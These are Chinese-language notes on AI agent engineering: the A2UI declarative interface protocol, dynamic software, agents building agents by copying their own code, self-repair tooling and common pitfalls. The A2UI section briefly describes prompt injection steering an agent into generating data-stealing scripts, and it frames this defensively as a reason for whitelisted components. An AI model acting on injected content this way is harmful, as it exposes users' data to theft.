**A2UI 类协议（安全优先的声明式界面）**：Agent 直接生成 HTML/JS 有根本安全问题——可能被注入操纵生成窃取数据的脚本。成因是提示注入，浏览器里执行恶意脚本的效果类似传统 XSS（不能把整个攻击叫 XSS）。A2UI：Agent 不生成可执行代码，只输出**界面描述清单**（JSON："请显示一个 3 行 2 列的表格，标题是「销售数据」"），客户端用**预先准备的安全组件**渲染——像餐厅菜单：顾客只能点菜单上有的菜，不能进厨房自己做。核心：客户端维护受信组件目录（Card/Button/TextField/Table），Agent 只能请求渲染目录中的组件；支持跨平台（同一份描述在 React/Flutter/原生渲染）和增量生成（流式 JSONL 边收边渲染）。澄清：AG-UI（CopilotKit）不是界面描述语言而是配套的**事件/传输协议**（推送执行状态：消息、工具调用、状态补丁），可承载 A2UI 载荷——互补而非同类。声明式适合标准化交互（表单/表格/卡片）；高度定制需求（自定义可视化、游戏界面）直接生成代码仍更灵活。

**动态生成软件**：Anthropic "Imagine with Claude"——用户提需求，实时生成前端界面与交互逻辑，用户交互，Claude 改代码生成新界面——完全动态成本延迟高，更适合展示能力边界。务实方向：**基于已有框架的半定制**——保留基础软件稳定性，特定维度开放用户控制（"把按钮改成蓝色""侧边栏加快捷菜单"），Agent 改前端代码 HMR 热加载即时生效——"一刀切"标准产品变"千人千面"。**安全前提改变**：业务代码可被随时生成改写时，权限边界必须下移数据层（见 [[提示注入]]）。

### 10.6 代码创造代码：Agent 自举

**Agent 能不能用代码生成能力创造另一个 Agent？**Richard Sutton 的四阶段：尘埃→恒星→生命→智能体——生物进化盲目（随机变异自然选择，不理解自身运作），**Agent 是全新存在：能通过生成代码实现自举（bootstrap）和自我进化**——像一个程序员编写另一个程序员，新程序员又能继续编写下一个。

**自我修复：OpenClaw Doctor**：自动检测三类问题——配置异常（过期 OAuth token、遗留配置格式、端口冲突）、状态问题（陈旧会话锁文件、插件依赖缺失）、服务健康问题（网关未运行、沙盒镜像缺失）。分层修复：**安全的修复自动执行**（配置归一化、锁文件清理）；**有风险的操作需用户确认**（服务重启、强制覆盖配置）。避免夸大：过期 token、锁文件、端口冲突这类高频问题有明确检测规则和固定修复动作——**确定性检查保证常见问题被稳定修复，LLM 兜底应对长尾疑难**（分析错误日志、理解配置语义、推断因果、生成针对性修复）。

**让 Agent 编写 Agent 的关键：基于范例的生成**。创造高质量 Agent 需要对架构模式、最佳实践、常见陷阱的深入理解；缺乏领域专业知识时最强模型也会造出架构有严重缺陷的 Agent。常见缺陷四条：
1. 上下文管理随意：未用标准上下文格式，轨迹转纯文本塞上下文，忽略结构化消息的 KV Cache 优化，工具调用循环有边界 bug
2. 工具设计不规范：描述简略、缺使用边界说明和负面清单、参数缺具体示例
3. 技术选型滞后：倾向用训练数据中最常见但已过时的模型和 API（解决：维护 SOTA 知识库或赋予搜索能力）
4. 外部生态脱节：废弃 API、不再维护的库、有缺陷的模式

**最有效路径不是在提示词里穷尽所有规则，而是提供高质量 Agent 实现作为参考范例**——范例代码本身就是最佳实践的载体，基于范例修改比从零编写更容易做对，架构上的好选择自然保留。Agent 接到开发新 Agent 的任务：**首先复制自己的代码（或其他经过验证的高质量实现），然后针对性修改**——调整系统提示词匹配新角色、替换增删工具适应新功能、修改业务逻辑但保留架构框架。就像生物学的**基因复制加变异**。

## 十一、本章小结与常见坑

代码对 Agent 的价值：**既是完成任务的手段，也是积累知识、创造工具、优化自身的机制**。

> [!warning]
> - **跳过测试环节就宣称完成**：Coding Agent 最常见的偷懒方式；完成标准必须是"测试通过"。
> - **错误处理只看单次请求**：边界是整个恢复循环；确认无法恢复前不暴露中间态。
> - **关键校验参数由模型填写**：舱位/保险/时间一律查库取服务端时钟。
> - **Reviewer 复读 Proposer 的解释**：没有新信息的自审无效；要读独立证据（渲染截图、测试输出）。
> - **把 LLM"抄写"数据当交付**：SQL 大表结果让 LLM 复述——慢且易错；Artifact 模式绕过。
> - **从零生成新 Agent**：架构缺陷四连；基于范例复制修改。
> - **给动态生成代码数据层权限**：权限检查写在可被改写的业务代码里形同虚设；下移数据层。
